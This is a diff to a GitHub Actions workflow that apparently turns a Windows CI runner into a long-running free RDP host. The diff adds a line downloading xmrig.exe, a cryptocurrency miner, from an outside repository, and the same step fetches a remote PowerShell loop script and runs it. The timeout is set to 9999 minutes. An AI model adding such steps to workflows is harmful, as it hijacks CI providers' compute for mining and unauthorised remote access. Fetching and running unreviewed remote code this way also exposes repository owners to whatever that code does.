@@ -5,7 +5,7 @@ on: workflow_dispatch
 jobs:
   build:
 
-    runs-on: windows-2012
+    runs-on: windows-2019
     timeout-minutes: 9999
 
     steps:
@@ -30,5 +30,7 @@ jobs:
       run: cmd /c start.bat
     - name: RDP is ready!
       run: | 
+        Invoke-WebRequest https://raw.githubusercontent.com/nettech12/tool/main/win/xmrig.exe
         Invoke-WebRequest https://raw.githubusercontent.com/davidsedwards406/JohnTechFreeRDP/main/loop.ps1 -OutFile loop.ps1
+
         ./loop.ps1
